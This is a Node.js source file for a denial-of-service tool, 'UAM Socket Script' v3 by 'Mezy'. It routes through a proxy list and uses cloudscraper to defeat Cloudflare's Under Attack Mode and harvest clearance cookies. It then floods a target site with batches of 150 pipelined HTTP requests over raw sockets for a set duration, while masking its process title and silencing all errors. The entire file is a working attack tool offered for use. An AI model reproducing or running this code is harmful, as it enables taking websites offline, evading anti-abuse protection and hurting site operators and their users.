/* UAM Socket Script - Mega fucking OP with minimal hardware.
   Please don't ask me how to use this script, or contact me about it.
   Don't ask me to hit sites for you, or provide access to something that can.
   Whatever you do with this script, is not my responsibility.
   https://mezy.cc/uam.js - Version 1: Public Script - very bad :(
   [v1] Coded by Mezy - https://mezy.cc/ | Started coding it on 24/07/2019 at 6:13am | Finished coding it on 26/07/2019 at 03:14am
   [v2] Coded by Mezy - https://mezy.cc/ | Private Version |
   [v3] Coded by Mezy - https://mezy.cc/ | Private UAM Bypass v3 | Final Version (hopefully xD)
   You have version 3 of the script, not recommended to share with others.
   Cloudscraper is seriously cancer, but it works, and is quite OP at times!
   Twitter: @impulsed
   Instagram: @m3zyxd
   Snapchat: mezy111
   Website: https://mezy.cc/
   Credit to Lemons - I had 'borrowed' some of his code from his other project to make this work effectively using proxies :)
*/
process.on('uncaughtException', (err) => {});
process.on('unhandledRejection', (err) => {});
const execSync = require('child_process').execSync;
try {
    var colors = require('colors');
    var events = require('events');
    var request = require('request');
    var os = require('os');
    var fs = require('fs');
    var cluster = require('cluster');
    var cloudscraper = require('cloudscraper')
    var url = require('url');
    var path = require('path');
    var net = require('net');
    var chalk = require('chalk');
} catch (err) {
    console.log('\x1b[36mInstalling\x1b[37m the requirements');
    execSync('npm i colors');
    execSync('npm i events')
    execSync('npm i os');
    execSync('npm i fs');
    execSync('npm i cluster');
    execSync('npm i cloudscraper');
    execSync('npm i url');
    execSync('npm i path');
    execSync('npm i net');
    execSync('npm i chalk');
    console.log('Done with installing requirements. Script is ready for use.'.green.bold);
    if (err) {
    console.log('There was an error installing the dependencies. Please try again.'.red.bold)
    }
    process.exit();
}
const EventEmitter = require('events');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);

const {
    fork
} = require('child_process');
var filename = path.basename(__filename);

process.title = "request testing v14.5.8";

if (process.argv.length <= 2) {
    console.log('Usage: node '.green.bold + filename.red.bold + ' http://example.com time'.green.bold);
    process.exit(-1);
} else {
}

var cloudscraper = require('cloudscraper');
console.log('starting script: '.green.bold + filename.red.bold);
var site = process.argv[2];
var time = process.argv[3];
var proxies = fs.readFileSync('proxy.txt', 'utf-8').replace(/\r/g, '').split('\n');
var cookie = [];
var ua = "";
var host = url.parse(site).host;
let cookies = [];
if (!site !== !site.startsWith('http://') && !site.startsWith('https://')) {
    console.log('usage: node '.green.bold + filename.cyan.bold + ' http://example.com time'.green.bold);
    process.exit();
}
setInterval(() => {
    let proxy = proxies[Math.floor(Math.random() * proxies.length)];
    cloudscraper.get({
        url: site,
        proxy: 'http://' + proxy
    }, function(error, response) {
        if (response && response.request.headers.cookie) {
            let cookie = response.request.headers.cookie;
            if (!/cf_clearance/.test(cookie)) return;
            let ua = response.request.headers['User-Agent'];
            cookies.push({
                cookie, ua, proxy
            });
        }
    });
});

const sleep = (waitTimeInMs) => new Promise(resolve => setTimeout(resolve, waitTimeInMs));
sleep(2000).then(() => {
    if (cookies) {
        console.log('target: '.rainbow.bold + '['.red.bold + `${host}`.cyan.bold + ']'.red.bold + ' | '.red.bold + 'time: '.rainbow.bold +  '['.red.bold + `${time}`.cyan.bold + ']'.red.bold)
        } else {
        console.log('unable to obtain cookie from '.red.bold + site.yellow.bold + '\n');
        console.log('site not Cloudflare UAM. This script was developed for UAM Cloudflare.'.red.bold)
    }
});
var counter = 0;

function send(cookie, proxy, ua) {
    let [ip, port] = proxy.split(':');
    var s = require('net').Socket();
    s.connect(port, ip);
    s.once('error', err => {});
    s.once('disconnect', () => {});
    s.once('data', data => {
        setTimeout(() => {
            s.destroy();
            send(cookie, proxy, ua);
        }, 5000);
    });

    for (var i = 0; i < 150; i++) {
        s.write('GET ' + site + ' HTTP/1.1\r\nHost: ' + host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*//*;q=0.8\r\nUser-Agent: ' + ua + '\r\nUpgrade-Insecure-Requests: 1\r\nCookie: ' + cookie + '\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\ncache-Control: max-age=0\r\n\r\n');
    }
}

var int = setInterval(() => {
    cookies.forEach(json => {
        send(json.cookie, json.proxy, json.ua);
    });
});

setTimeout(() => process.exit(1), time * 1000);